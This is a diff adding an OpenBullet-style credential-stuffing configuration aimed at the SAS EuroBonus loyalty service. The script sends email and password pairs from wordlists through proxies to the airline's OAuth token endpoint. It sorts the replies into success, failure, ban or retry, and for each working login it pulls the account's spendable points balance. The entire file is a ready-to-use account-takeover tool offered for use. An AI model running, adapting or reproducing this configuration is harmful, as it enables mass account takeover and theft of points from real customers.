@@ -1,0 +1,73 @@
+[SETTINGS]
+{
+  "Name": "Flysas",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-08-18T12:29:05.0193013+02:00",
+  "AdditionalInfo": "",
+  "Author": "Itamai",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.flysas.com//authorize/oauth/token" 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "accept-language: de_de" 
+  HEADER "authorization: Basic U0FTLVVJOg==" 
+  HEADER "Content-Type: application/x-www-form-urlencoded;charset=UTF-8" 
+  HEADER "DNT: 1" 
+  HEADER "Origin: https://www.flysas.com" 
+  HEADER "Referer: https://www.flysas.com/de-de/eurobonus/punkte-einlosen/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "wir konnten Sie mit dieser Kombination aus Login-ID und Passwort nicht finden" 
+    KEY "Leider wurde Ihr Konto gesperrt" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+  KEYCHAIN Ban OR 
+    KEY "403 - Forbidden" 
+    KEY "502 - Bad Gateway" 
+    KEY "bloqueado por PolÃ­tica de Seguridad" 
+    KEY "Please login to browse the internet" 
+  KEYCHAIN Retry OR 
+    KEY "Es tut uns leid, aber wir können Ihre Anfrage im Augenblick nicht bearbeiten. Bitte versuchen Sie es später erneut" 
+
+PARSE "<SOURCE>" LR "access_token\":\"" "\",\"" -> VAR "auth" 
+
+PARSE "<SOURCE>" LR "customerSessionId\":\"" "\"" -> VAR "id" 
+
+REQUEST GET "https://api.flysas.com//customer/euroBonus/getAccountInfo?pageNumber=1&customerSessionId=<id>" 
+  
+  HEADER "DNT: 1" 
+  HEADER "Origin: https://www.flysas.com" 
+  HEADER "Referer: https://www.flysas.com/de-de/eurobonus/punkte-einlosen/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36" 
+  HEADER "Accept: */*" 
+  HEADER "accept-language: de_de" 
+  HEADER "authorization: <auth>" 
+
+PARSE "<SOURCE>" LR "totalPointsForUse\":\"" "\"" -> CAP "Points" 
+
